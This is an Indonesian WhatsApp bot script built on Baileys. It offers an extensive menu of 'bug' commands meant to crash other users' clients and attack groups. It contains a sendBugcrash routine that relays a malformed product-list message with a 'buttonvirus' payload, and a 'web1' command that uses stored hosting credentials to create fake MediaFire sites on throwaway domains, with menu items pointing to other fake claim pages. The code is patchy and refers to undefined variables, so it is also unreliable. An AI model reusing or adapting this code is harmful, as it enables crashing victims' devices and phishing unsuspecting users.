//SC BY TANZZ GG DILARANG MEMPERJUAL KAN SC INI KALAU MAU REUPLOAD TARO CREDIT GW Tanzz Wangsaff SC ERROR? CHAT WA https://wa.me/60162276340


const { modul } = require('./module');
const { axios, baileys, chalk, cheerio, child_process, crypto, fs, ffmpeg, jsobfus, moment, ms, speed, util } = modul;
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, reSize, generateProfilePicture } = require('./lib/myfunc')
const { buttonvirus } = require('./scrape/buttonvirus')
const os = require('os')
const { color, bgcolor } = require('./lib/color')
const { uptotelegra } = require('./scrape/upload')
const tiktok = require('./scrape/tiktok')
const audionye = fs.readFileSync('./y.mp3')
const owner = JSON.parse(fs.readFileSync('./database/owner.json').toString())

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {},
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}

global.ownerName = 'Rian'
global.ownerNumber = ["62812641823529@s.whatsapp.net"]
global.prefa = ['','.']
global.mess = {
    wait: 'Wait Sis Please be patient',
    succes: 'Good Luck Sis ?',
    admin: 'Group Admin Special Features!!!',
    botAdmin: 'Bots Must Be Admins First!!!',
    owner: 'Lu Siapa Kocak?',
    group: 'Features Used Only For Groups!!!',
    private: 'Features Used Only For Private Chat!!!',
    bot: 'Bot Number User Special Features!!!',
    error: 'Error Sis, Please Chat Owner...',
}
//=================================================//
module.exports = diablo = async (diablo, diablobotwhatsapp, chatUpdate, store) => {
try {
        const body = (diablobotwhatsapp.mtype === 'conversation') ? diablobotwhatsapp.message.conversation : (diablobotwhatsapp.mtype == 'imageMessage') ? diablobotwhatsapp.message.imageMessage.caption : (diablobotwhatsapp.mtype == 'videoMessage') ? diablobotwhatsapp.message.videoMessage.caption : (diablobotwhatsapp.mtype == 'extendedTextMessage') ? diablobotwhatsapp.message.extendedTextMessage.text : (diablobotwhatsapp.mtype == 'buttonsResponseMessage') ? diablobotwhatsapp.message.buttonsResponseMessage.selectedButtonId : (diablobotwhatsapp.mtype == 'listResponseMessage') ? diablobotwhatsapp.message.listResponseMessage.singleSelectReply.selectedRowId : (diablobotwhatsapp.mtype == 'templateButtonReplyMessage') ? diablobotwhatsapp.message.templateButtonReplyMessage.selectedId : (diablobotwhatsapp.mtype === 'messageContextInfo') ? (diablobotwhatsapp.message.buttonsResponseMessage?.selectedButtonId || diablobotwhatsapp.message.listResponseMessage?.singleSelectReply.selectedRowId || diablobotwhatsapp.text) : ''
//=================================================//        
        const budy = (typeof diablobotwhatsapp.text == 'string' ? diablobotwhatsapp.text : '')
        const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const content = JSON.stringify(diablobotwhatsapp.message)
        const { type, quotedMsg, mentioned, now, fromMe } = diablobotwhatsapp
        const isCmd = body.startsWith(prefix)
        const from = diablobotwhatsapp.key.remoteJid
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = diablobotwhatsapp.pushName || "No Name"
        const botNumber = await diablo.decodeJid(diablo.user.id)
        const itsMediablo = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(diablobotwhatsapp.sender)
        const itsMe = diablobotwhatsapp.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = diablobotwhatsapp.quoted ? diablobotwhatsapp.quoted : diablobotwhatsapp
        const mime = (quoted.msg || quoted).mimetype || ''
        const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
		const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
		const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
		const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')   
        const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')  
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedMsg = (type == 'extendedTextMessage')
		const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
		const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
		const isQuotedDocument = isQuotedMsg ? content.includes('documentMessage') ? true : false : false
		const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
		const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false
        const hariRaya = new Date('January 1, 2023 00:00:00')
        const sekarang = new Date().getTime()
        const Selisih = hariRaya - sekarang
        const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
        const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const jmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60))
        const jdetik = Math.floor( Selisih % (1000 * 60) / 1000)
        const sender = diablobotwhatsapp.isGroup ? (diablobotwhatsapp.key.participant ? diablobotwhatsapp.key.participant : diablobotwhatsapp.participant) : diablobotwhatsapp.key.remoteJid
             const isGroup = diablobotwhatsapp.chat.endsWith('@g.us')
        const groupMetadata = diablobotwhatsapp.isGroup ? await diablo.groupMetadata(diablobotwhatsapp.chat).catch(e => {}) : ''
        const groupName = diablobotwhatsapp.isGroup ? groupMetadata.subject : ''
        const participants = diablobotwhatsapp.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = diablobotwhatsapp.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = diablobotwhatsapp.isGroup ? groupMetadata.owner : ''
        const groupMembers = diablobotwhatsapp.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = diablobotwhatsapp.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = diablobotwhatsapp.isGroup ? groupAdmins.includes(diablobotwhatsapp.sender) : false
    	const isAdmins = diablobotwhatsapp.isGroup ? groupAdmins.includes(diablobotwhatsapp.sender) : false
//=================================================//
const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
"mimetype": "image/webp",
"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
"fileLength": "14240",
"mediaKeyTimestamp": "1664991742",
"isAnimated": false
}}}
//=================================================//
const deploy = (teks) => {
  diablo.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}   
//=================================================//   
const reply = (teks) => {
return diablo.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC TANZABOT`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"6281389368689Url": `https://youtube.com/@azaaalynne`}}}, { quoted: m })} 	
//=================================================// 
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[diablobotwhatsapp.sender]
if (typeof user !== 'object') global.db.users[diablobotwhatsapp.sender] = {}
const chats = global.db.chats[diablobotwhatsapp.chat]
if (typeof chats !== 'object') global.db.chats[diablobotwhatsapp.chat] = {}
} catch (err) {
console.error(err)
}

var sticBanLu = (hehe) => {
ano = fs.readFileSync('./basetanzz/stickernye/BanLu.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}

if (!diablo.public) {
if (!diablobotwhatsapp.key.fromMe) return
}

if (!diablobotwhatsapp.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(diablobotwhatsapp.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname))
}
if (diablobotwhatsapp.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(diablobotwhatsapp.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
}

if (diablobotwhatsapp.sender.startsWith('212')) return diablo.updateBlockStatus(diablobotwhatsapp.sender, 'block')

ppuser = 'https://raw.githubusercontent.com/JasRunJ/filenya/master/a4cab58929e036c18d659875d422244d.jpg'
ppnyauser = await reSize(ppuser, 200, 200)

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `${buttonvirus}`, 
"jpegThumbnail": ppnyauser
}
}
}

if (command) {
diablo.sendPresenceUpdate('composing', from)
diablo.readMessages([diablobotwhatsapp.key])
}

async function replyNya(teks) {
                       const buttonsDefault = [{ quickReplyButton: { displayText : `${buttonvirus}`, id : `.menu` } }]                 
                       const buttonMessage = { 
                                    text: teks, 
                                    footer: "", 
                                    templateButtons: buttonsDefault, 
                                    image: {url: ppnyauser}                                   
                                               }
                       return diablo.sendMessage(from, buttonMessage)
                }

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        );
        const result = {
            status: 200,
            author: `diablo`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function sendBugcrash(jid, title, description, footer, thumbnail, ownerBusines, produk, productIdImg) {
let prod = {
listMessage: {
title: title,
description: description,
listType: 2,
productListInfo: {
productSections: [{
title: title,
products: produk
}],
headerImage: {
productId: productIdImg,
jpegThumbnail: thumbnail
},
businessOwnerJid: ownerBusines
},
footerText: footer,
}
}
let progene = await generateWAMessageFromContent(jid, prod, { quoted : lep })
return diablo.relayMessage(progene.key.remoteJid, progene.message, {
messageId: ""
})
}
switch (command) {
case 'menu':
jiren = `
╭━┄━┄━┄━┄┄━┄━┄━┄━┄━┄━┄━┄━┄┄━┄━
│⩽⩾ NAME BOT : 👾᭄ 𝐑𝐢𝐚𝐧 𝐁𝐎𝐓😈᭄
│⩽⩾ OWNER NAME : 👾᭄ 𝐑𝐢𝐚𝐧 𝐁𝐎𝐓😈᭄
│⩽⩾ BOT VERSION : 99
│⩽⩾ OWNER NUMBER : wa.me/Nomor lo
│⩽⩾ RUN ON : Panel
╰━┄━┄━┄━┄┄━┄━┄━┄━┄━┄━┄━┄━┄┄━┄━
╭━┄━┄━┄━┄┄━┄━┄━┄━┄━┄━┄━┄━┄┄━┄━
│⫹⫺ OWNER MENU
│⫹⫺ verify [ NUMBER ]
│⫹⫺ unverify [ NUMBER ]
│⫹⫺ tag [ PESAN ]
╰━┄━┄━┄━┄┄━┄━┄━┄━┄━┄━┄━┄━┄┄━┄━
╭━┄━┄━┄━┄┄━┄━┄━┄━┄━┄━┄━┄━┄┄━┄━
│⫹⫺ BOT MENU
│⫹⫺ stats ( UNTUK MELIHAT STATUS)
│⫹⫺ test ( UNTUK MELIHAT STATUS)
│⫹⫺ naga ( UNTUK MELIHAT NAGA )
╰━┄━┄━┄━┄┄━┄━┄━┄━┄━┄━┄━┄━┄┄━┄━
╭━┄━┄━┄━┄┄━┄━┄━┄━┄
│⫹⫺ jadivirtex (TEXT)
╰━┄━┄━┄━┄┄━┄━┄━┄━┄
╭━┄━┄━┄━┄┄━┄━┄━┄━┄━┄
│⫹⫺.   ANIME MENU🌸   ⫹⫺
│⫹⫺ waifu (RANDOM)
│⫹⫺ loli ( RANDOM )
│⫹⫺ husbu ( RANDOM )
│⫹⫺ milf ( RANDOM )
│⫹⫺ cosplay ( RANDOM )
│⫹⫺ wallml ( RANDOM )
│⫹⫺ neko ( RANDOM )
│⫹⫺ ppcp ( PPCOUPLE )
╰━┄━┄━┄━┄┄━┄━┄━┄━┄
╭━┄━┄━┄━┄┄━┄━┄━┄━┄━┄
│⫹⫺.   HENTAI MENU🔞.  ⫹⫺
│⫹⫺ nwaifu (🔞)
│⫹⫺ hneko (🔞)
│⫹⫺ milf (🔞)
│⫹⫺ trap (🔞)
╰━┄━┄━┄━┄┄━┄━┄━┄━┄
╭━┄━┄━┄━┄┄━┄━┄━┄━┄━┄
│⫹⫺.  DOWNLOAD MENU📂.  ⫹⫺
│⫹⫺ ytmp3 ( LINK VD YT )
│⫹⫺ ytmp4 ( LINK VD YT )
│⫹⫺ tiktok ( LINK VD )
╰━┄━┄━┄━┄┄━┄━┄━┄━┄
╭━┄━┄━┄━┄┄━┄━┄━┄━┄━┄
│⫹⫺.  FUN MENU💕. ⫹⫺.
│⫹⫺ sticker ( IMAGE TO STICKER )
│⫹⫺ patrick ( PATRICK STICKER )
│⫹⫺ emojimix ( CONTOH: 💜+💛 )
╰━┄━┄━┄━┄┄━┄━┄━┄━┄
╭━┄━┄━┄━┄┄━┄━┄━┄━┄━┄
│⫹⫺.  WEB MENU. ⫹⫺
│⫹⫺ .web1 ( MEDIAFIRE MP4 )
│⫹⫺ .web2 ( MEDIAFIRE FILE )
│⫹⫺ .web3 ( SIMONTOK )
│⫹⫺ .web4 ( MOBILE LEGENDS CLAIM )
│⫹⫺ .web5 ( GRUP WA XXX V1 )
│⫹⫺ .web6 ( GRUP WA XXX V2 )
│⫹⫺ .web7 ( DANA KAGET )
╰━┄━┄━┄━┄┄━┄━┄━┄━┄

`

diablobotwhatsapp.reply(jiren)
case 'bugmenu':
jiren = ` 
╭━┄━┄━┄━┄┄━┄━┄━┄━┄━┄━┄━┄━┄┄━┄━
│⩽⩾ NAME BOT : TANZZ GG
│⩽⩾ OWNER NAME : TANZ GG
│⩽⩾ BOT VERSION : 6
│⩽⩾ OWNER NUMBER : wa.me/Nomor mu
│⩽⩾ RUN ON : HEROKU
╰━┄━┄━┄━┄┄━┄━┄━┄━┄━┄━┄━┄━┄┄━┄━
╭━┄━┄━┄━┄┄━┄━┄━┄━┄━┄━┄━┄━┄┄━┄━
│⫹⫺ OWNER MENU
│⫹⫺ verify [ NUMBER ]
│⫹⫺ unverify [ NUMBER ]
│⫹⫺ tag [ PESAN ]
╰━┄━┄━┄━┄┄━┄━┄━┄━┄━┄━┄━┄━┄┄━┄━
╭━┄━┄━┄━┄┄━┄━┄━┄━┄━┄━┄━┄━┄┄━┄━
│⫹⫺ BOT MENU
│⫹⫺ stats ( UNTUK MELIHAT STATUS)
│⫹⫺ test ( UNTUK MELIHAT STATUS)
│⫹⫺ naga ( UNTUK MELIHAT NAGA )
╰━┄━┄━┄━┄┄━┄━┄━┄━┄━┄━┄━┄━┄┄━┄━

　　╱▔▔▔▔▔╲  Rian
 ╱  ╱▔╲╲╲▏   Bots
╱  ╱━╱▔▔▔▔▔╲━╮  
▏ ▕┃▕╱▔╲╱▔╲▕╮┃  
▏ ▕╰━▏▊▕▕▋▕▕━╯  
╲  ╲╱▔╭╮▔▔┳╲╲   
 ╲  ▏╭━━━━╯▕▕   
  ╲ ╲▂▂▂▂▂▂╱╱   
    ▏         ╲ 
    ▏      ▕╲  ╲
 ╱▔╲▏      ▕╱▔╲▕
 ▏    ╰    ╯   ▕▕
 ╲   ╲    ╱   ╱ ╲
  ╲  ▕▔▔▔▔▏  ╱╲╲╲▏
 ╱▔  ▕    ▏  ▔╲▔▔
 ╲▂▂▂╱    ╲▂▂▂╱
 
 
░░░░░░▄▄
░░░░░█░░█  SUBSCRIBE Channel YANZ MODS BUG
▄▄▄▄▄█░░█▄▄▄
▓▓▓▓█░░░░░░░█
▓▓▓▓█░░░░░░░░█
▓▓▓▓█░░░░░░░░█
▓▓▓▓█░░░░░░░░█
███▀▀▀███████ 
 👾᭄ 😈᭄
┏━┳┳┳━┳┳┓
┃━┫┃┃┏┫━┫┏┓
┃┏┫┃┃┗┫┃┃┃┃
┗┛┗━┻━┻┻┛┃┃
┏┳┳━┳┳┳┓┏┫┣┳┓
┃┃┃┃┃┃┃┃┣┻┫┃┃
┣┓┃┃┃┃┣┫┃┏┻┻┫
┗━┻━┻━┻
GA SUBSCRIBE GA WORK 100%
https://youtube.com/@Atcker


━┄━┄━┄━┄┄━┄━┄━┄━┄
  BUG HIJAU

╭───────────────
┃➤ 🌱 [ NO TARGET ]
┃➤ 🌲 [ NO TARGET ]
┃➤ 🌳 [ NO TARGET ]
┃➤ 🌴 [ NO TARGET ]
┃➤ 🌵 [ NO TARGET ]
┃➤ 🌾 [ NO TARGET ]
┃➤ 🌿 [ NO TARGET ]
┃➤ ☘️ [ NO TARGET ]
┃➤ 🍀 [ NO TARGET ]
┃➤ 🐸 [ NO TARGET ]
┃➤ 🐊 [ NO TARGET ]
┃➤ 🐢 [ NO TARGET ]
┃➤ 🐲 [ NO TARGET ]
╰---------------------------------------
━┄━┄━┄━┄┄━┄━┄━┄━┄
  COUNTRY BUG
╭───────────────
┃➤ 🇦🇨 [ NO TARGET]
┃➤ 🇦🇪 [ NO TARGET]
┃➤ 🇦🇫 [ NO TARGET]
┃➤ 🇦🇬 [ NO TARGET]
┃➤ 🇦🇱 [ NO TARGET]
┃➤ 🇦🇲 [ NO TARGET]
┃➤ 🇦🇴 [ NO TARGET]
┃➤ 🇦🇷 [ NO TARGET]
┃➤ 🇧🇷 [ NO TARGET]
┃➤ 🇵🇹 [ NO TARGET]
┃➤ 🇮🇩 [ NO TARGET]
┃➤ 🇲🇾 [ NO TARGET]
╰---------------------------------------
━┄━┄━┄━┄┄━┄━┄━┄━┄
     EMOJI BUG
╭───────────────
┃➤ 😤 [ NO TARGET]
┃➤ 🗣️ [ NO TARGET]
┃➤ ☣️ [ NO TARGET]
┃➤ ⚠️ [ NO TARGET]
┃➤ ☢️ [ NO TARGET]
┃➤ 🔊 [ NO TARGET]
┃➤ 💩 [ NO TARGET]
┃➤ 🏮 [ NO TARGET]
┃➤ 😘 [ NO TARGET]
┃➤ 😎 [ NO TARGET]
┃➤ 🦏 [ NO TARGET]
┃➤ 🦁 [ NO TARGET]
┃➤ 🐯 [ NO TARGET]
┃➤ 👽 [ NO TARGET]
┃➤ 👹 [ NO TARGET]
┃➤ 💥 [ NO TARGET]
┃➤ 🥭 [ NO TARGET]
┃➤ 🌸 [ NO TARGET]
┃➤ 🍆 [ NO TARGET]
┃➤ 🍊 [ NO TARGET]
┃➤ 🍋 [ NO TARGET]
┃➤ 🍐 [ NO TARGET]
┃➤ 🌷 [ NO TARGET]
┃➤ 🗿 [ NO TARGET]
┃➤ 🔥 [ NO TARGET]
┃➤ 🤡 [ NO TARGET]
┃➤ 💀 [ NO TARGET]
┃➤ 😈 [ NO TARGET]
╰---------------------------------------
━┄━┄━┄━┄┄━┄━┄━┄━
   BUG MENU
╭───────────────
┃➤ banned [ NO TARGET ]
┃➤ santet  [ NO TARGET ]
┃➤ kill     [ NO TARGET ]
┃➤ brutal  [ NO TARGET ]
┃➤ bug1000 [ NO TARGET ]
┃➤ bug      [ NO TARGET ]
┃➤ troli      [ NO TARGET ]
┃➤ bom     [ NO TARGET ]
┃➤ mental  [ NO TARGET ]
┃➤ crash [ NO TARGET ]
┃➤ ganas [ NO TARGET ]
┃➤ button [ NO TARGET ]
┃➤ trava [ NO TARGET ]
┃➤ katalog [ NO TARGET ]
┃➤ bugmex [ NO TARGET ]
┃➤ bugsuhu [ NO TARGET ]
┃➤ bugjago [ NO TARGET ]
┃➤ bugdarkness [ NO TARGET ]
┃➤ bugwaifu [ NO TARGET ]
┃➤ bugbully [ NO TARGET ]
┃➤ bugslebew [ NO TARGET ]
┃➤ bugneko [ NO TARGET ]
┃➤ bughentai [ NO TARGET ]
┃➤ jasonkiller [ NO TARGET ]
┃➤ tanzakiller [ NO TARGET ]
┃➤ thanoskiller [ NO TARGET ]
┃➤ diablobug [ NO TARGET ]
┃➤ tanzasendbug1 [ NO TARGET ]
┃➤ tanzasendbug2 [ NO TARGET ]
┃➤ tanzasendbug3 [ NO TARGET ]
┃➤ tanzaboykot [ NO TARGET ]
┃➤ tanzagokil [ NO TARGET ]
┃➤ cabul [ NO TARGET ]
┃➤ perkosa [ NO TARGET ]
┃➤ cucuk [ NO TARGET ]
┃➤ unlimitedkarma [ NO TARGET ]
┃➤ gass [ NO TARGET ]
┃➤ kamunanya [ NO TARGET ]
┃➤ gasbro [ NO TARGET ]
┃➤ amanbro? [ NO TARGET ]
┃➤ crasher [ NO TARGET ]
┃➤ megabug [ NO TARGET ]
┃➤ fuckyou [ NO TARGET ]
┃➤ lempartaik [ NO TARGET ]
┃➤ alokhamil [ NO TARGET ]
┃➤ toxic [ NO TARGET ]
┃➤ tabok [ NO TARGET ]
┃➤ haha [ NO TARGET ]
┃➤ sedot [ NO TARGET ]
┃➤ bugnaga [ NO TARGET ]
┃➤ dragonbug [ NO TARGET ]
┃➤ ampunbg [ NO TARGET ]
╰---------------------------------------
━┄━┄━┄━┄┄━┄━┄━┄━┄
     BUG TANZZ
╭───────────────
┃➤ tanzagas1 [ NO TARGET ]
┃➤ tanzagas2 [ NO TARGET ]
┃➤ tanzagas3 [ NO TARGET ]
┃➤ tanzagas4 [ NO TARGET ]
┃➤ tanzagas5 [ NO TARGET ]
┃➤ tanzabug1 [ NO TARGET ]
┃➤ tanzabug2 [ NO TARGET ]
┃➤ tanzabug3 [ NO TARGET ]
┃➤ tanzabug4 [ NO TARGET ]
┃➤ tanzabug5 [ NO TARGET ]
┃➤ tanzaboykot [ NO TARGET ]
┃➤ tanzakenon [ NO TARGET ]
┃➤ tanzagokil [ NO TARGET ]
┃➤ tanzaentod [ NO TARGET ]
┃➤ tanzajebol [ NO TARGET ]
┃➤ tanzakiller [ NO TARGET ]
┃➤ tanzacounter [ NO TARGET ]
┃➤ tanzamega [ NO TARGET ]
┃➤ tanzzbug1 [ NO TARGET ]
│➤ tanzzbug2 [ NO TARGET ]
│➤ tanzzbug3 [ NO TARGET ]
│➤ tanzzbug4 [ NO TARGET ]
│➤ tanzzbug5 [ NO TARGET ]
│➤ tanzzbug6 [ NO TARGET ]
│➤ tanzzbug7 [ NO TARGET ]
│➤ tanzzbug8 [ NO TARGET ]
│➤ tanzzbug9 [ NO TARGET ]
│➤ tanzzbug10 [ NO TARGET ]
╰---------------------------------------
    BUG VERIF
╭───────────────
┃➤ banned [ NO TARGET ]
┃➤ logout [ NO TARGET ]
┃➤ kenon [ NO TARGET ]
┃➤ verif [ NO TARGET ]
┃➤ tanzzverif [ NO TARGET ]
┃➤ tanzzlogout [ NO TARGET ]
┃➤ tanzzkenon [ NO TARGET ]
┃➤ tanzzbanned [ NO TARGET ]
┃➤ report [ NO TARGET ]
╰---------------------------------------
━┄━┄━┄━┄┄━┄━┄━┄━┄
     SPECIAL BUG
╭───────────────
┃➤ tanza1000 [ NO TARGET ]
┃➤ lastbug [ NO TARGET ]
╰---------------------------------------
━┄━┄━┄━┄┄━┄━┄━┄━┄━
     OTHER BUG
╭───────────────️
┃➤ aduhcuy [ FIX!! ]
┃➤ poll [ VOTE! ]
┃➤ trojan[ NOMOR WA ]
╰---------------------------------------
━┄━┄━┄━┄┄━┄━┄━┄━┄
   ATTACK GROUP
╭───────────────
┃➤ santetgc (Linkgrup)
┃➤ boykotgc (Linkgrup)
┃➤ tanzzgassgc (Linkgrup
┃➤ buggc (Linkgrup)
┃➤ entodgc (Linkgrup)
┃➤ tanzzbuggc (Linkgrup)
╰--------------------------------------
━┄━┄━┄━┄┄━┄━┄━┄━┄
   FREE FIRE BUG
╭───────────────
┃➤ sg2 [ NO TARGET ]
│➤ sg2sg6 [ NO TARGET ]
│➤ ak47 [ NO TARGET ]
│➤: granat [ NO TARGET ]
│➤ landmine [ NO TARGET ]
│➤ awm [ NO TARGET ]
│➤ plasma [ NO TARGET ]
│➤ deserteagle [ NO TARGET ]
│➤ pepengshot [ NO TARGET ]
│➤ m182b [ NO TARGET ]
│➤ panci [ NO TARGET]
│➤ mp40 [ NO TARGET ]
│➤ mp5 [ NO TARGET ]
╰----------------------------- 
━┄━┄━┄━┄┄━┄━┄━┄━┄
 VIRTEX
╭───────────────
┃⌦ virtexkarma
┃⌦ virtexair
┃⌦ virtexringan   
┃⌦ virtekbiasa  
╰-----------------------------
    GA JEDA, KICK+DELETE AKSES 
`

diablobotwhatsapp.reply(jiren)
break
case 'akses':
diablobotwhatsapp.reply(`UNTUK AKSES BOT CHAT OWNER : wa.me/628126823529`)
break
case 'sewa':
diablobotwhatsapp.reply(`UNTUK SEWA BOT CHAT OWNER : wa.me/628121823529`)
break

case 'restart':{
 if (!isGroup) return diablobotwhatsapp.reply(`wajib dalam grup`)
if (!isGroupAdmins) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
        txts = `DONE BANG`
        diablobotwhatsapp.reply(txts)
 let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
  let o
  try {
  o = exec('pm2 restart all')
  } catch (e) {
  o = e
 } finally {
let { stdout, stderr } = o
}
}
break
                  case 'web1' :
                  id = msg.key.remoteJid
        if(validGrup(id,grups)){


        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "mediafire" + makeid(7) + "." + "viralbokepnew2022.ml"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("sedang membuat... tunggu ± 1 menit")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.rakaganz.xyz/arga/mediafire/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                reply("Proses...")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mediafire",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.rakaganz.xyz/arga/mediafire/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply("_*BERHASIL!*, Data Telah di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_")
                    }


                    hasillrndy = `- Web Mediafire MP4\n==========================\nWebsite : https://${domain}\nWeb Setting : https://${domain}/vhsfhqpdhdsih6/nextnesia.php\n==========================\n_Tunggu 1-2 Menit Agar webnya siap digunakan_`


                    reply(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    }else{
        reply("ini grup siapa?")
    }
    break

case 'web2' :
id = msg.key.remoteJid
        if(validGrup(id,grups)){


        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
